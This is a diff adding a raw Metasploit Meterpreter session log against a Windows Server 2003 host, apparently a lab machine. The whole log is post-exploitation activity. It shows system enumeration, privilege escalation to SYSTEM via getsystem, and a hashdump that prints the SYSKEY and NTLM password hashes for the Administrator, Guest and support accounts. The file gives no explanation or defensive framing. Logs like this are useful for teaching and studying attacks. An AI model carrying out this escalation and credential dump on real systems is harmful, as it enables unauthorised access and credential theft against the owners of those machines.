@@ -1,0 +1,27 @@
+meterpreter > sysinfo
+Computer        : SMB-SERVER
+OS              : Windows .NET Server (Build 3790, Service Pack 1).
+Architecture    : x86
+System Language : en_US
+Domain          : WIDGET-CORP
+Logged On Users : 2
+Meterpreter     : x86/win32
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > run hashdump
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 59dbb6e67d769a2f428d821ea1891d7c...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:b49b7750e2f7f2bdd3da9522f2b4feb4:::
